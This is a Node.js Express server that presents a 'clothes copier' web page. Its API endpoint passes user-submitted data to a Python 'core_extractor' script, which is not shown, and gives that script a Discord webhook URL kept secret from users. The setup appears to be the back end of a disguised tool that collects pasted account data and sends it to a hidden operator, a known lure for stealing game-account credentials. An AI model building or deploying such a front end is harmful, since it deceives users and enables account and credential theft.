const express = require('express');
const { execFile } = require('child_process');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Set your permanent secret Discord webhook URL here so users don't have to enter it
const SECRET_DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";

// Route specifically for /clothes-copier
app.get('/clothes-copier', (req, res) => {
    const targetFile = 'clothes-copier.html';
    const filePath = path.join(__dirname, 'public', targetFile);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('Clothes copier page not found.');
    }
});

// Optional: Redirect root to /clothes-copier
app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

app.post('/api/process', (req, res) => {
    const { data } = req.body;
    if (!data) {
        return res.status(400).json({ success: false, error: "Missing data payload" });
    }

    execFile('python3', ['core_extractor.py', data], {
        env: { ...process.env, DISCORD_WEBHOOK_URL: SECRET_DISCORD_WEBHOOK }
    }, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ success: false, error: "Extractor execution failed.", details: stderr || error.message });
        }
        res.json({ success: true, output: stdout });
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Server running on port ${PORT}`);
});
